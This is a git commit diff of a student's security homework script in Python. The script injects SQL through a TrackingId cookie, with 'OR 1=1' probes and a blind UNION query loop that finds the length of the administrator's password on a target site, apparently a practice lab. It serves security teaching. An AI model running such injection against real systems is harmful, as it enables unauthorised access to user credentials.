3c88c6ec5007fa3bc959d9eed4346b537a9dffc6
Maksim Semchuk <semchuk2@pdx.edu>
2021-04-25 15:15:48 -0500

    Find length

--- Lab Notebook #2 and HW2/hw2/hw2.py
+++ Lab Notebook #2 and HW2/hw2/hw2.py
@@ -2,9 +2,11 @@
 # CS 495 Homework #2
 
 
+# Needed Imports:
 import requests, sys
 from bs4 import BeautifulSoup
 import urllib.parse
+import time
 
 site = sys.argv[1]
 if 'https://' in site:
@@ -12,6 +14,8 @@ if 'https://' in site:
 
 url = f'https://{site}/'
 
+
+# Step 4: Inital Program:
 def try_query(query):
     print(f'Query: {query}')
     mycookies = {'TrackingId': urllib.parse.quote_plus(query) }
@@ -24,3 +28,17 @@ def try_query(query):
 
 print(try_query("""x' OR 1=1 --"""))
 print(try_query("""x" OR 1=1 --"""))
+
+# Step 6: Find the password Length:
+begin_time = time.perf_counter()
+num = 1
+while True:
+    query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
+    print(f'Trying length {num}')
+    if try_query(query) == False:
+        num = num + 1
+    else:
+        break
+
+print(f"Password length is {num}")
+print(f"Time elapsed is {time.perf_counter()-begin_time}")
